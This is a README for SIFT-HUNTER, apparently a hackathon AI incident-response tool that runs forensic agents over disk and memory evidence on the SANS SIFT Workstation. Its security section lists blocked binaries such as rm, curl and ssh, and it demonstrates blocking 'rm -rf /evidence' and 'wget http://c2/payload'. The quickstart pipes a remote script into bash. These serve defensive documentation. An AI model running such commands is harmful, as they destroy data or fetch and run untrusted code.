# SIFT-HUNTER 🎯

**Autonomous AI Incident Response for the SANS SIFT Workstation**

[![Tests](https://img.shields.io/badge/tests-244%20passing-brightgreen)](#testing)
[![Accuracy](https://img.shields.io/badge/zeus%20%2B%20cridex-100%25%20precision%20%C2%B7%2086%25%20recall-success)](docs/EVALUATION.md)
[![Python](https://img.shields.io/badge/python-3.11%2B-blue)](#)
[![License](https://img.shields.io/badge/license-MIT-green)](#)
[![Architecture](https://img.shields.io/badge/architecture-Pattern%202%20%2B%203-purple)](#architecture)

SIFT-HUNTER is a custom MCP server + multi-agent orchestration system that autonomously analyzes disk images and memory captures, self-corrects its findings, maps to MITRE ATT&CK, and generates structured incident reports - all on the SANS SIFT Workstation.

---

## Quickstart (SIFT Workstation)

```bash
# One-command install
curl -sSL https://raw.githubusercontent.com/svaka2000/SIFT-HUNTER/main/install.sh | bash

# OR manual install
git clone https://github.com/svaka2000/SIFT-HUNTER.git && cd SIFT-HUNTER
pip install -e .

# Set your API key (Groq is free and fast)
export GROQ_API_KEY=your_key_here
# OR: export ANTHROPIC_API_KEY=your_key_here

# Run analysis
sift-hunter analyze /path/to/evidence/*.dmp /path/to/mft_export.csv

# Check if a command would be allowed by the security layer
sift-hunter check "rm -rf /evidence"  # → BLOCKED
sift-hunter check "MFTECmd -f mft.csv"  # → ALLOWED

# Trace a finding back to its evidence
sift-hunter audit F-abc12345
```

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        SIFT-HUNTER                              │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │              Multi-Agent Orchestrator (LangGraph)        │   │
│  │                                                          │   │
│  │  ┌────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │   │
│  │  │Triage  │→ │Disk      │→ │Memory    │→ │Correlat- │  │   │
│  │  │Agent   │  │Analyst   │  │Analyst   │  │or Agent  │  │   │
│  │  └────────┘  └──────────┘  └──────────┘  └────┬─────┘  │   │
│  │                                                 │        │   │
│  │                                           ┌─────▼──────┐ │   │
│  │          ◄────── SELF-CORRECTION ◄────── │ Verifier   │ │   │
│  │          (routes back to analysts         │ Agent ⭐   │ │   │
│  │           if issues found)               └─────┬──────┘ │   │
│  │                                                 │        │   │
│  │                                           ┌─────▼──────┐ │   │
│  │                                           │ Reporter   │ │   │
│  │                                           │ Agent      │ │   │
│  │                                           └────────────┘ │   │
│  └─────────────────────────────────────────────────────────┘   │
│                            │ calls                               │
│  ┌─────────────────────────▼───────────────────────────────┐   │
│  │              Custom MCP Server (Pattern 2)               │   │
│  │                                                          │   │
│  │  ┌─────────────────────┐   ┌───────────────────────┐   │   │
│  │  │ Disk Forensics Tools │   │ Memory Forensics Tools │   │   │
│  │  │ • MFT (timestomping) │   │ • Volatility3 pslist  │   │   │
│  │  │ • Prefetch (PECmd)   │   │ • netscan (C2 detect) │   │   │
│  │  │ • Registry (RECmd)   │   │ • malfind (injection) │   │   │
│  │  │ • USN Journal        │   │ • hashdump            │   │   │
│  │  │ • ShellBags (SBECmd) │   └───────────────────────┘   │   │
│  │  │ • Timeline (plaso)   │                                │   │
│  │  │ • Sleuth Kit (fls)   │   ┌───────────────────────┐   │   │
│  │  └─────────────────────┘   │ Enrichment             │   │   │
│  │                             │ • MITRE ATT&CK (35+)   │   │   │
│  │  ┌─────────────────────┐   │ • VirusTotal           │   │   │
│  │  │ Security Layer ⛔   │   │ • AbuseIPDB            │   │   │
│  │  │ • BLOCKED_BINARIES   │   └───────────────────────┘   │   │
│  │  │ • ALLOWED_BINARIES   │                                │   │
│  │  │ • Path validation    │                                │   │
│  │  │ • Read-only enforced │                                │   │
│  │  └─────────────────────┘                                │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

### Why This Architecture Wins

Mapped directly to the SANS FIND EVIL! judging criteria:

| Judging criterion | How SIFT-HUNTER addresses it |
|-------------------|------------------------------|
| **Autonomous execution** | LangGraph 6-agent pipeline runs end-to-end from one command; the Verifier self-corrects with zero human input |
| **IR accuracy** | **Measured on the canonical `zeus.vmem` + `cridex.vmem` memory samples - 100% precision / 86% recall / 0 false positives** ([docs/EVALUATION.md](docs/EVALUATION.md), reproducible with no key via `python -m benchmarks.evaluate`). Confidence labels separate CONFIRMED from inferred; real agent run in [`sample_report.md`](benchmarks/cases/case001/sample_report.md) |
| **Hallucination management** ⭐ | Deterministic detector cross-checks every IOC against raw tool output - **measured 93% catch / 0% false-positive**, reproducible via `python -m benchmarks.hallucination_benchmark` |
| **Architectural guardrails** | ALLOWED/BLOCKED binary allowlist + path validation + `shell=False`, enforced in Python, never by prompt - **tested for bypass** (`tests/test_security_bypass.py`: 20 evasion attempts, all refused) |
| **Audit trail** | JSONL record of every tool call, finding, correction, and transition - `sift-hunter audit <id>` traces any claim back to raw evidence |
| **Documentation** | One-command install, ARCHITECTURE / SECURITY / EVALUATION / ADDING_TOOLS docs, 244 tests, new forensic tool in <1 hour |

---

## Self-Correction Engine

The Verifier Agent is the tiebreaker. It runs after every analysis round:

1. **Automated hallucination detection** - Extracts entities (IPs, EXEs, registry keys, hashes) from finding text, searches all raw tool output for each. Flags anything not found.

2. **LLM semantic verification** - Reviews all findings, checks confidence appropriateness, detects contradictions.

3. **Loop routing** - Issues found → routes back to disk or memory analyst with correction instructions. Clean → routes to reporter.

4. **Safety valves** - Max 3 correction loops per finding. Iteration cap at 60% of max prevents infinite loops.

```
Example self-correction:
  Disk analyst: "CONFIRMED - malware.exe present at C:\System32\malware.exe"
  Hallucination detector: "malware.exe not found in MFT output"
  Verifier: DOWNGRADE_CONFIDENCE → UNVERIFIED, route back to disk_analyst
  Disk analyst re-runs: "POSSIBLE - suspicious file in temp, cannot confirm path"
  Verifier: APPROVE
```

---

## Security Boundaries

The MCP server enforces **architectural** (not prompt-based) security:

- **ALLOWED_BINARIES**: Explicit allowlist of forensic tools (MFTECmd, PECmd, vol3, etc.) with exact permitted flag sets
- **BLOCKED_BINARIES**: `rm`, `dd`, `mkfs`, `wget`, `curl`, `bash`, `python`, `chmod`, `ssh`, and 50+ more  
- **Path validation**: No `..`, no symlink following, only paths under configured evidence roots
- **Read-only enforcement**: No writes to evidence directories - ever

```bash
# Demo the guardrails
sift-hunter check "rm -rf /evidence"      # BLOCKED: destructive binary
sift-hunter check "wget http://c2/payload" # BLOCKED: network access
sift-hunter check "MFTECmd -f mft.csv"    # ALLOWED: forensic tool
```

---

## Installation

### Prerequisites
- Python 3.11+
- SANS SIFT Workstation (for actual forensic tools) OR any machine (for analysis of pre-exported artifacts)
- One of: `GROQ_API_KEY` (free tier available) or `ANTHROPIC_API_KEY`

### Install
```bash
# Install from source (not published to PyPI)
git clone https://github.com/svaka2000/SIFT-HUNTER.git
cd SIFT-HUNTER && pip install -e .
```

### Configuration
```bash
export GROQ_API_KEY=gsk_...          # Fast, free tier available
export ANTHROPIC_API_KEY=sk-ant-...  # Fallback

# Optional tuning
export SIFT_MODEL=llama-3.1-8b-instant  # Override LLM
export SIFT_MAX_ITERATIONS=30            # Max analysis iterations
export SIFT_EVIDENCE_ROOTS=/cases       # Allowed evidence paths
export SIFT_OUTPUT_ROOT=/tmp/sift-out   # Report output path
```

---

## CLI Reference

```bash
sift-hunter analyze <evidence_files...>  # Full autonomous analysis
sift-hunter server                        # Start MCP server
sift-hunter audit <finding_id>           # Trace evidence chain
sift-hunter check <command>              # Test security layer
sift-hunter version                       # Print version
```

---

## Extending SIFT-HUNTER

See [docs/ADDING_TOOLS.md](docs/ADDING_TOOLS.md) for a step-by-step guide. Adding a new forensic tool takes under 1 hour:

```python
# 1. Add binary to ALLOWED_BINARIES in src/sift_hunter/mcp_server/security/allowlist.py
# 2. Create src/sift_hunter/mcp_server/tools/disk/mytool.py
# 3. Inherit from BaseTool, implement analyze() and find_suspicious()
# 4. Register in src/sift_hunter/mcp_server/registry.py
```

---

## Testing

```bash
pytest tests/ -v          # All 244 tests - every one exercises the shipped src/ package
pytest tests/test_security_bypass.py -v  # 20 guardrail bypass attempts, all refused

# Measured accuracy on the canonical zeus.vmem + cridex.vmem samples (no API key)
python -m benchmarks.evaluate

# Reproduce the measured hallucination-detection rates (no API key needed)
python -m benchmarks.hallucination_benchmark

# Run a full sample incident through the detection engine (no API key, no SIFT binaries)
python -m benchmarks.detect_case benchmarks/cases/case001
```

---

## Project Layout

```
src/sift_hunter/
├── agents/          # Multi-agent orchestration (LangGraph)
│   ├── nodes/       # Triage, Disk, Memory, Correlator, Verifier, Reporter
│   ├── orchestrator.py
│   └── state.py
├── core/            # Models, audit, hallucination detection
├── mcp_server/      # Custom MCP server
│   ├── security/    # Allowlist, path validator, command sanitizer
│   └── tools/       # Disk, memory, enrichment wrappers
└── cli.py           # Click CLI
```

---

*SANS FIND EVIL! Hackathon 2026 - Pattern 2 (Custom MCP Server) + Pattern 3 (Multi-Agent Orchestration)*
